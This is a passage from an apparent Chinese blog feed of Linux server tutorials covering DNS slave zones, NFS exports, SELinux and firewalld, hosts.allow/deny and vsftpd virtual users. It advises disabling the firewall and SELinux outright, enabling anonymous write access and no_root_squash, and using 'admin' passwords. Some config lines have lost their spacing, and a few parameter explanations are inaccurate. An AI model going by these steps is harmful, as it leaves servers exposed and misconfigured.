class="line"></span><br><span class="line">nameserver 10.1.82.232      #  在 resolv.conf 文件末尾添加该行</span><br></pre></td></tr></table></figure><p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p><p>配置完后使用 nslookup dig 等工具进行测试即可</p><hr><h2 id="配置主从-DNS"><a href="#配置主从-DNS" class="headerlink" title="配置主从 DNS"></a>配置主从 DNS</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><strong>环境：</strong></p><p>centos 7（主），IP：10.1.82.232<br>centos 7（从），IP：10.1.82.235</p><h3 id="二、实例-1"><a href="#二、实例-1" class="headerlink" title="二、实例"></a>二、实例</h3><p>主服务器的配置文件照上正常配置即可</p><p>从服务器只需在区域配置文件末尾中添加如下配置即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">zone &quot;test.com&quot; IN &#123;#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;test.com.zone&quot;;#  设置主服务器正向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;        #  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;                     #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;10.1.82.zone&quot;;    #  设置主服务器反向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p><p>配置完后使用 nslookup dig 等工具进行测试即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置-DNS&quot;&gt;&lt;a href=&quot;#配置-DNS&quot; class=&quot;headerlink&quot; title=&quot;配置 DNS&quot;&gt;&lt;/a&gt;配置 DNS&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;一、简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;把域名翻译成IP地址的软件称为域名系统，即 DNS</summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>NFS</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-02-10T10:55:44.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>NFS</code>（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件</p><p>配置文件（默认为空文件）：<code>/etc/exports</code><br>管理命令：<code>/usr/sbin/exportfs</code><br>共享资源的日志文件：<code>/var/lib/nfs/*tab</code><br>客户端查询共享资源命令：<code>/usr/sbin/showmount</code></p><p><code>NFS</code> 服务主要进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpc.nfsd#  最主要的 NFS 进程，管理客户端是否可登录</span><br><span class="line">rpc.mountd#  挂载和卸载 NFS 文件系统，包括权限管理</span><br><span class="line">rpc.lockkd#  管理文件锁，避免同时写出错（非必要）</span><br><span class="line">rpc.statd#  检查文件一致性，可修复文件（非必要）</span><br></pre></td></tr></table></figure><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p><code>/etc/exports</code> 配置文件常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ro#  只读</span><br><span class="line">rw#  读写</span><br><span class="line">sync#  将数据同步写入内存缓冲区与磁盘中（效率低，但可保证数据的一致性）</span><br><span class="line">async#  将数据先保存在内存缓冲区中，必要时才写入磁盘</span><br><span class="line">insecure#  允许客户端从大于 1024 的 TCP&#x2F;IP 端口连接服务器</span><br><span class="line">secure（默认）          #  限制客户端只能从小于 1024 的 TCP&#x2F;IP 端口连接旧服务器</span><br><span class="line">wdelay（默认）          #  检查是否有相关的写入操作，如有则将这些写入操作一起执行（该参数为默认参数）</span><br><span class="line">subtree_check（默认）   #  若输出目录是一个子目录，则 NFS 服务器将检查其父目录的权限</span><br><span class="line">no_subtree_check       #  即使输出目录是一个子目录，NFS 服务器也不检查其父目录的权限（可提高效率）</span><br><span class="line">no_wdelay       #  若有写入操作则立即执行（应与 sync 配合使用）</span><br><span class="line">root_squash     #  将来访问的 root 用户映射为匿名用户或用户组</span><br><span class="line">no_root_squash#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br><span class="line">all_squash      #  所有访问用户都映射为匿名用户或用户组</span><br><span class="line">no_all_squash#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br></pre></td></tr></table></figure><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、编辑配置文件"><a href="#1、编辑配置文件" class="headerlink" title="1、编辑配置文件"></a>1、编辑配置文件</h3><p>配置文件格式为：<code>路径 + IP、掩码 + 参数</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#  创建需共享的文件夹</span><br><span class="line">mkdir -p &#x2F;data&#x2F;web_data</span><br><span class="line">#  在 &#x2F;etc&#x2F;exports 配置文件中添加如下内容</span><br><span class="line">&#x2F;data&#x2F;web_data192.168.1.0&#x2F;24(rw,no_root_squash)</span><br></pre></td></tr></table></figure><h3 id="2、刷新配置"><a href="#2、刷新配置" class="headerlink" title="2、刷新配置"></a>2、刷新配置</h3><p>刷新配置：<code>exportfs -a</code></p><h3 id="3、重启服务"><a href="#3、重启服务" class="headerlink" title="3、重启服务"></a>3、重启服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;&lt;code&gt;NFS&lt;/code&gt;（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件&lt;/p&gt;
&lt;p&gt;配置文件（默认为空</summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SELinux 防火墙</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-02-10T10:51:35.782Z</updated>
    
    <content type="html"><![CDATA[<p><strong>注：</strong> 搭建服务前须关闭防火墙（否则会导致服务无法访问）</p><h2 id="一、firewalld-防火墙"><a href="#一、firewalld-防火墙" class="headerlink" title="一、firewalld 防火墙"></a>一、firewalld 防火墙</h2><p>查看 firewalld 防火墙状态：<code>systemctl status firewalld</code><br>关闭 firewall 防火墙 <code>systemctl stop firewalld</code></p><h2 id="二、SELinux-防火墙"><a href="#二、SELinux-防火墙" class="headerlink" title="二、SELinux 防火墙"></a>二、SELinux 防火墙</h2><p><strong>简介：</strong><br>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。</p><p><strong>SELinux 分三种模式</strong>：<br>Enforcing（强制模式）、Permissive（警告模式）、Disabled（关闭模式）</p><p>查看防火墙当前状态：<code>getenforce</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#  关闭 SELinux 防火墙</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;selinux&#x2F;config#  编辑 selinux 防火墙的配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># This file controls the state of SELinux on the system.</span><br><span class="line"># SELINUX&#x3D; can take one of these three values:</span><br><span class="line">#     enforcing - SELinux security policy is enforced.</span><br><span class="line">#     permissive - SELinux prints warnings instead of enforcing.</span><br><span class="line">#     disabled - No SELinux policy is loaded.</span><br><span class="line">SELINUX&#x3D;enforcing#  需将此处更改为 disabled（默认为 enforcing）</span><br><span class="line"># SELINUXTYPE&#x3D; can take one of three two values:</span><br><span class="line">#     targeted - Targeted processes are protected,</span><br><span class="line">#     minimum - Modification of targeted policy. Only selected processes are protected. </span><br><span class="line">#     mls - Multi Level Security protection.</span><br></pre></td></tr></table></figure><p>更改完后输入命令使其生效 <code>setenforce 0</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt; 搭建服务前须关闭防火墙（否则会导致服务无法访问）&lt;/p&gt;
&lt;h2 id=&quot;一、firewalld-防火墙&quot;&gt;&lt;a href=&quot;#一、firewalld-防火墙&quot; class=&quot;headerlink&quot; title=&quot;一、firewall</summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Hosts.allow、Hosts.deny 文件</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-02-10T10:55:23.361Z</updated>
    
    <content type="html"><![CDATA[<p><strong>文件优先级：</strong> <code>先 deny，后 allow，如有冲突则按 allow 文件内的规则处理</code></p><h2 id="hosts-allow-文件"><a href="#hosts-allow-文件" class="headerlink" title="hosts.allow 文件"></a>hosts.allow 文件</h2><p>hosts.allow 文件内的内容为允许服务列表<br>默认路径：<code>/etc/hosts.allow</code><br>格式：<code>服务名 + IP + allow</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sshd:all:allow      #  允许所有主机</span><br><span class="line">sshd:192.168.1.:allow       #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:allow      #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:allow   #  允许 1.0 网段的所有主机</span><br></pre></td></tr></table></figure><h2 id="hosts-deny-文件"><a href="#hosts-deny-文件" class="headerlink" title="hosts.deny 文件"></a>hosts.deny 文件</h2><p>hosts.deny 文件内的内容为拒绝服务列表<br>默认路径：<code>/etc/hosts.deny</code><br>格式：<code>服务名 + IP + deny</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sshd:all:deny       #  拒绝所有主机</span><br><span class="line">sshd:192.168.1.:deny        #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:deny       #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:deny    #  拒绝 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;文件优先级：&lt;/strong&gt; &lt;code&gt;先 deny，后 allow，如有冲突则按 allow 文件内的规则处理&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;hosts-allow-文件&quot;&gt;&lt;a href=&quot;#hosts-allow-文件&quot; class=&quot;he</summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>VSFTP</title>
    <link href="https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/"/>
    <id>https://administratorrs.github.io/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</id>
    <published>2021-02-08T16:00:00.000Z</published>
    <updated>2021-03-22T08:53:43.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p><p><code>ftp</code> 有 <code>ASCII</code> 模式与 <code>Binary</code>（二进制） 模式</p><ul><li><code>ASCII</code> 模式用来传递 <code>HTML</code> 和文本编写的文件（如用 <code>Binary</code> 模式传递则会破坏-文件，导致文件执行出错）</li><li><code>Binary</code> 模式用来传递可执行文件，压缩文件，和图片文件（如用 <code>ASCII</code> 模式传递，则会乱码）</li></ul><p>默认端口号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制：21</span><br><span class="line">传输：20</span><br></pre></td></tr></table></figure><hr><h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 vsftp <code>yum -y install vsftpd</code></p><p>默认配置文件 <code>/etc/vsftpd/vsftpd.conf</code></p><p>PAM 认证配置文件路径 <code>/etc/pam.d</code></p><p><code>vsftpd.conf</code> 配置文件常用参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#  全局设置</span><br><span class="line">listen_port&#x3D;21#  设置监听端口</span><br><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">allow_writeable_chroot&#x3D;yes#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br><span class="line">#  传输</span><br><span class="line">ascii_upload_enable&#x3D;yes#  启用 ASCII 模式上传数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">ascii_download_enable&#x3D;yes#  启用 ASCII 模式下载数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">#  被动模式相关（如启用了被动模式，则在客户端使用 ftp 访问时需使用 passive 关闭客户端的被动模式，强制其使用port方式连接。如需开启则再次运行该命令）</span><br><span class="line">pasv_enable&#x3D;yes         #  启用被动模式</span><br><span class="line">pasv_promiscuous&#x3D;yes#  关闭 PASV 模式的安全检查（该检查确保数据连接和控制连接是来自同一 IP）</span><br><span class="line">pasv_max_port&#x3D;4500#  PASV 使用的最大端口</span><br><span class="line">pasv_min_port&#x3D;4000#  PASV 使用的最小端口</span><br><span class="line">pasv_address&#x3D;192.168.1.1#  PASV 模式传输的地址（访问的客户端 IP 跟此处的 IP 不一致时会报错）</span><br><span class="line">#  限制</span><br><span class="line">max_clients&#x3D;100#  最大客户端连接数为 100</span><br><span class="line">max_per_ip&#x3D;3#  每个 IP 最大连接数为  3</span><br><span class="line">deny_file&#x3D;&#123;*.exe,&#39;*root*&#125;#  禁止上传 .exe 的文件和文件名带有 root 的文件</span><br><span class="line">chroot_list_enable&#x3D;yes#  启用限制用户的名单</span><br><span class="line">chroot_list_file&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;test#  在 test 文件内指定用户列表（泽泻用户作为“例外”，不受限制）</span><br><span class="line">chroot_local_user&#x3D;yes#  所有用户被限制在其主目录下（不能访问除主目录外的其他目录）</span><br><span class="line"></span><br><span class="line">#  匿名用户相关配置</span><br><span class="line">anonymous_enable&#x3D;yes#  允许匿名用户访问（配置文件内默认有该参数）</span><br><span class="line">anon_root&#x3D;&#x2F;test#  指定匿名用户目录</span><br><span class="line">#  匿名用户权限相关</span><br><span class="line">anon_upload_enable&#x3D;yes#  允许匿名用户上传文件（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes#  允许匿名用户创建目录（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_world_readable_only&#x3D;yes#  文件权限中其他用户需有可读的权限，匿名用户才能下载（文件权限分：用户、组、其他用户）</span><br><span class="line">anon_umask&#x3D;022        #  设置匿名用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">#  匿名用户限制相关</span><br><span class="line">anon_max_rate&#x3D;30000#  匿名用户限速为 30k&#x2F;s</span><br><span class="line">anon_other_write_enable&#x3D;yes#  匿名用户拥有删除权限</span><br><span class="line"></span><br><span class="line">#  虚拟用户相关</span><br><span class="line">local_root&#x3D;&#x2F;test#  指定虚拟用户目录（由于是基于本地用户的，所以需使用此行，文件权限设置为 777）</span><br><span class="line">guest_enable&#x3D;yes#  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（默认有该行配置，但文件名为vsftpd）</span><br><span class="line">virtual_use_local_privs&#x3D;yes#  使虚拟用户跟本地用户权限相同（配置此行后需使用用户的参数来配置虚拟用户）</span><br><span class="line"></span><br><span class="line">#  用户相关配置</span><br><span class="line">local_root&#x3D;&#x2F;test#  指定用户访问目录</span><br><span class="line">local_umask&#x3D;022#  设置用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">local_max_rate&#x3D;30000#  用户限速为 30k&#x2F;s</span><br></pre></td></tr></table></figure><hr><h2 id="三、配置本地用户访问"><a href="#三、配置本地用户访问" class="headerlink" title="三、配置本地用户访问"></a>三、配置本地用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_root&#x3D;&#x2F;test</span><br></pre></td></tr></table></figure><h3 id="2、创建用户"><a href="#2、创建用户" class="headerlink" title="2、创建用户"></a>2、创建用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd test    #  新建 test 用户</span><br><span class="line">passwd test     #  设置密码（此处需确认密码）</span><br></pre></td></tr></table></figure><h3 id="3、创建目录"><a href="#3、创建目录" class="headerlink" title="3、创建目录"></a>3、创建目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;test         #  创建目录</span><br><span class="line">chmod 755 &#x2F;test     #  设置目录权限</span><br><span class="line">chown test:test &#x2F;test   #  设置该目录所属用户跟组</span><br></pre></td></tr></table></figure><p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p><h3 id="4、登陆测试"><a href="#4、登陆测试" class="headerlink" title="4、登陆测试"></a>4、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123</span><br></pre></td></tr></table></figure><hr><h2 id="四、配置虚拟用户访问"><a href="#四、配置虚拟用户访问" class="headerlink" title="四、配置虚拟用户访问"></a>四、配置虚拟用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">guest_enable&#x3D;yes    #  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（需注释掉原有的行，并复制原文件另存为 vsftpd.vu）</span><br><span class="line">allow_writeable_chroot&#x3D;yes#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br></pre></td></tr></table></figure><h3 id="2、创建映射的账号并设置虚拟用户的账号跟密码"><a href="#2、创建映射的账号并设置虚拟用户的账号跟密码" class="headerlink" title="2、创建映射的账号并设置虚拟用户的账号跟密码"></a>2、创建映射的账号并设置虚拟用户的账号跟密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#  创建虚拟用户映射的用户（该用户不可登陆）</span><br><span class="line">useradd -s &#x2F;sbin&#x2F;nologin virtftp</span><br><span class="line"></span><br><span class="line">#  创建存放用户名跟密码的文件</span><br><span class="line">touch ftpuser.txt</span><br></pre></td></tr></table></figure><p><code>ftpuser.txt</code> 文件内容如下（单数行为用户名，双数行为密码）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftpadmin</span><br><span class="line">admin</span><br><span class="line">ftpuser</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p>由于保存虚拟用户跟密码的文本无法被直接调用，所以需生成数据库文件：<br><code>db_load -T -t hash -f ftpuser.txt ftpuser.db</code></p><h3 id="3、创建用户配置文件"><a href="#3、创建用户配置文件" class="headerlink" title="3、创建用户配置文件"></a>3、创建用户配置文件</h3><p>创建虚拟用户的配置目录及其配置文件：<br><code>mkdir /etc/vsftpd/user_conf</code><br><code>touch /etc/vsftpd/user_conf/ftpadmin</code><br><code>touch /etc/vsftpd/user_conf/ftpuser</code></p><p>ftpadmin 配置内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes</span><br><span class="line">anon_other_write_enable&#x3D;yes</span><br><span class="line">anon_umask&#x3D;022</span><br></pre></td></tr></table></figure><p>ftpuser 配置内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br></pre></td></tr></table></figure><h3 id="4、配置-PAM-认证"><a href="#4、配置-PAM-认证" class="headerlink" title="4、配置 PAM 认证"></a>4、配置 PAM 认证</h3><p>根据 vsftpd.conf 配置将 PAM 认证文件名更改为对应的名称：<br><code>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.vu</code></p><p>注释 <code>vsftpd.vu</code> 文件内所有行，并在文件末尾添加如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#  此处末尾的路径为虚拟用户账号跟密码文件所在的绝对路径（无需后缀名）</span><br><span class="line">authrequiredpam_userdb.sodb&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br><span class="line">accountrequiredpam_userdb.sodb&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br></pre></td></tr></table></figure><p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p><h3 id="5、登陆测试"><a href="#5、登陆测试" class="headerlink" title="5、登陆测试"></a>5、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123#  如服务重启无报错，登陆失败则可能是 PAM 配置文件的问题</span><br></pre></td></tr></table></figure><hr><h2 id="五、PAM-配置文件简介"><a href="#五、PAM-配置文件简介" class="headerlink" title="五、PAM 配置文件简介"></a>五、PAM 配置文件简介</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器名称    模块类型    控制方式    模块路径    模块参数</span><br></pre></td></tr></table></figure><h3 id="服务器名称："><a href="#服务器名称：" class="headerlink" title="服务器名称："></a>服务器名称：</h3><p>设置服务器名称时字母需小写</p><h3 id="模块类型："><a href="#模块类型：" class="headerlink" title="模块类型："></a>模块类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth        #  